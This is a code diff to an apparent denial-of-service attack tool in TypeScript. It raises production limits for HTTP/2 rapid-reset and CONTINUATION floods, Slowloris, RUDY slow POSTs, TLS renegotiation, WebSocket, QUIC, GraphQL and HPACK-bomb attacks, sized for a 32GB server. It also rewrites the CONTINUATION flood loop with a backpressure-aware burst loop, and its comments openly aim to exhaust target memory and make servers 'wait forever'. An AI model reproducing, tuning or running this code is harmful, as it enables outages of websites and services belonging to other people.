@@ -643,10 +643,11 @@ async function runHTTP2Flood(
 ): Promise<void> {
   const { connect: h2connect, constants: h2constants } = await import("node:http2");
 
-  // 32GB RAM / 8 vCPU optimized: 5× more sessions, 2× burst size per session
-  // Each H2 session: ~80KB V8 + TLS state — 200 sessions = ~16MB, trivial on 32GB
-  const STREAMS_PER_SESSION = Math.min(256, Math.max(32, threads * 3));
-  const NUM_SESSIONS        = Math.min(threads, 200);
+  // 32GB RAM / 8 vCPU optimized: each H2 session ~150KB (V8 + TLS + nghttp2 state)
+  // 500 sessions × 150KB = 75MB — trivial on 32GB. CVE-2023-44487 saturates at ~500 concurrent.
+  // Max streams per session raised to 512 — more RST+PING work forced per session per burst.
+  const STREAMS_PER_SESSION = Math.min(512, Math.max(32, threads * 3)); // was 256
+  const NUM_SESSIONS        = Math.min(threads, 500);                   // was 200
   const connectTarget       = `https://${resolvedHost}:${targetPort}`;
 
   let localPkts = 0, localBytes = 0;
@@ -767,7 +768,7 @@ async function runSlowlorisReal(
   const IS_DEV = process.env.NODE_ENV !== "production";
   const MAX_CONN = IS_DEV
     ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
-    : Math.min(threads * 80, 20000);        // prod: max 20K sockets
+    : Math.min(threads * 120, 50000);       // prod: 50K sockets × 80KB TLS = 4GB (32GB avail)
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -917,7 +918,7 @@ async function runConnFlood(
   const IS_DEV_CF = process.env.NODE_ENV !== "production";
   const MAX_CONN = IS_DEV_CF
     ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
-    : Math.min(threads * 60, 15000);        // prod: max 15K sockets
+    : Math.min(threads * 80, 40000);        // prod: 40K TLS sockets × 80KB = 3.2GB
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -1150,9 +1151,10 @@ async function runWAFBypass(
   const cacheT   = Math.max(1, Math.floor(threads * 0.25));
   const drainT   = Math.max(1, threads - primaryT - Math.floor(threads * 0.25));
 
-  const NUM_PRIMARY = Math.min(primaryT * 2, 400);
-  const NUM_CACHE   = Math.min(cacheT   * 3, 300);
-  const NUM_DRAIN   = Math.min(drainT   * 2, 150);
+  // 32GB/8vCPU: layer caps multiplied — each slot is ~150KB, 1000+600+300 = 1900 × 150KB = 285MB
+  const NUM_PRIMARY = Math.min(primaryT * 4, 1000); // was 400
+  const NUM_CACHE   = Math.min(cacheT   * 4, 600);  // was 300
+  const NUM_DRAIN   = Math.min(drainT   * 3, 300);  // was 150
   const STREAMS_PER = Math.min(128, Math.max(16, primaryT));
 
   let localPkts = 0, localBytes = 0;
@@ -1361,7 +1363,7 @@ async function runRUDY(
                   "/graphql","/form","/register","/api/import","/api/bulk","/api/batch",
                   "/api/v1/data","/api/v2/submit","/wp-login.php","/admin/login",
                   "/api/auth/login","/contact","/api/v1/user","/api/v2/create"];
-  const MAX_CONN   = Math.min(threads * 80, 25000);
+  const MAX_CONN   = Math.min(threads * 100, 60000); // was 25K; 60K × 20KB TCP = 1.2GB
   const FAKE_LEN   = 1_000_000_000; // Claim 1GB body — server waits forever
 
   let localPkts = 0, localBytes = 0;
@@ -1558,7 +1560,7 @@ async function runH2Continuation(
   };
 
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 400); // +100 prod slots
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 1000); // 32GB: 1K slots × 150KB = 150MB
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -1577,41 +1579,56 @@ async function runH2Continuation(
     let settled = false;
     const done = () => { if (!settled) { settled = true; resolve(); } };
 
+    // Backpressure-aware write: if kernel buffer is full, wait for drain
+    // before continuing — prevents unbounded buffer growth (OOM / silent drop)
+    const safeWrite = (buf: Buffer): Promise<void> => {
+      if (sock.destroyed) return Promise.resolve();
+      const ok = sock.write(buf);
+      if (ok) return Promise.resolve();
+      return new Promise<void>(r => {
+        if (sock.destroyed) { r(); return; }
+        sock.once("drain", r);
+      });
+    };
+
     sock.once("secureConnect", () => {
       sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
       localPkts++; localBytes += PREFACE.length + 18;
 
       let streamId = 1;
-      const attack = () => {
-        if (signal.aborted) { sock.destroy(); done(); return; }
 
-        // HEADERS frame: END_STREAM=1 but no END_HEADERS → forces CONTINUATION
-        const hpack = makeHpack(hostname);
-        sock.write(mkFrame(0x01, 0x01, streamId, hpack)); // 0x01=HEADERS, 0x01=END_STREAM only
-        localPkts++; localBytes += 9 + hpack.length;
+      // Async attack loop: burst CONTINUATION frames per stream, then yield
+      // Burst 50–300 × 8–16KB = 400KB–4.8MB per cycle — massive RAM pressure on server
+      // while remaining within socket write-buffer bounds (checked via drain).
+      const attack = async (): Promise<void> => {
+        while (!signal.aborted && !sock.destroyed) {
+          // HEADERS frame: END_STREAM=1 but NO END_HEADERS → forces server to buffer CONTINUATION
+          const hpack = makeHpack(hostname);
+          await safeWrite(mkFrame(0x01, 0x01, streamId, hpack));
+          localPkts++; localBytes += 9 + hpack.length;
 
-        // Flood CONTINUATION frames — server buffers all of them (8–16KB per frame)
-        // Burst range 100–2000 → worst case: 2000 × 16384B = 32MB allocated per stream cycle
-        const burst = randInt(100, 2000);
-        for (let i = 0; i < burst; i++) {
-          const cf = makeCont(streamId);
-          sock.write(cf);
-          localPkts++; localBytes += cf.length;
+          // Flood CONTINUATION frames — each frame forces server to reallocate its HPACK state
+          // keeping frame sizes large (8–16KB) to maximise per-stream memory on target
+          const burst = randInt(50, 300);
+          for (let i = 0; i < burst && !sock.destroyed; i++) {
+            const cf = makeCont(streamId);
+            await safeWrite(cf);
+            localPkts++; localBytes += cf.length;
+          }
+
+          // RFC 7540 §5.1.1: stream IDs are monotonically increasing, never reuse on same conn
+          if (streamId > 0x7FFFFF00) { sock.destroy(); done(); return; }
+          streamId += 2; // client uses odd stream IDs
+
+          // Yield to event loop between bursts so flush/drain events can fire
+          await new Promise<void>(r => setImmediate(r));
         }
-
-        // Wrap at 0x7FFFFF00 to avoid approaching the protocol limit (0x7FFFFFFF)
-        // RFC 7540: stream IDs MUST be monotonically increasing — never reset to 1 on same connection
-        if (streamId > 0x7FFFFF00) {
-          // Approaching stream ID limit — close and reconnect in next slot iteration
-          sock.destroy(); done(); return;
-        }
-        streamId += 2; // always odd for client
-        setImmediate(attack);
+        done();
       };
-      attack();
+      attack().catch(() => done());
     });
 
-    sock.on("data",    () => {}); // drain server responses
+    sock.on("data",    () => {}); // drain server GOAWAY / SETTINGS frames
     sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
     sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
     sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
@@ -1643,7 +1660,7 @@ async function runTLSRenego(
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 300);
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 800); // 32GB: 800 RSA slots; 8vCPU handles 800 × 10 renegotiations/sec
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -1746,8 +1763,8 @@ async function runH2SettingsStorm(
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 400);
-  const OPEN_STREAMS = IS_DEV ? 20 : 50; // half-open streams per connection
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800); // 32GB: 800 × 100KB = 80MB
+  const OPEN_STREAMS = IS_DEV ? 20 : 100; // PROD: 100 half-open streams × 800 slots = 80K pending streams
 
   const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
     const f = Buffer.allocUnsafe(9 + payload.length);
@@ -1887,7 +1904,7 @@ async function runWSFlood(
   onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 20, 5000);
+  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 30, 20000); // 32GB: 20K WS × 40KB = 800MB
   const useHttps  = targetPort === 443;
 
   const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
@@ -2130,7 +2147,7 @@ async function runGraphQLDoS(
     }
   };
 
-  await Promise.all(Array.from({ length: Math.min(threads, 300) }, () => runThread()));
+  await Promise.all(Array.from({ length: Math.min(threads, 800) }, () => runThread())); // 32GB: 800 concurrent fragment bombs
   clearInterval(flushIv);
   flush();
 }
@@ -2152,8 +2169,8 @@ async function runQUICFlood(
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 24);
-  const INFLIGHT  = IS_DEV ? 200 : 800;
+  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);   // 32GB: 64 UDP sockets
+  const INFLIGHT  = IS_DEV ? 200 : 2000; // 32GB: 2K inflight QUIC initials per socket
   const PKTSIZE   = 1200; // QUIC minimum MTU
 
   const makeQUICInitial = (): Buffer => {
@@ -2236,7 +2253,7 @@ async function runCachePoison(
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 600);
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1500 CDN-busting slots
 
   const rand    = (n: number) => Math.random() * n | 0;
   const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
@@ -2312,7 +2329,7 @@ async function runRUDYv2(
   onStats:      (p: number, b: number, c: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800);
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K multipart slow POSTs × 20KB = 40MB
   const SEND_MS   = 5_000;
 
   const chars    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -2388,7 +2405,7 @@ async function runSSLDeathRecord(
   onStats:      (p: number, b: number, c: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 400);
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 1000); // 32GB: 1K SSL-death slots
   const RATE_MS   = 10; // 100 records/sec per slot
 
   let openConns = 0;
@@ -2467,7 +2484,7 @@ async function runHPACKBomb(
   onStats:     (p: number, b: number) => void,
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 600);
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1.5K HPACK bomb connections
 
   // Raw H2 frame builder (identical layout to h2-continuation)
   const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
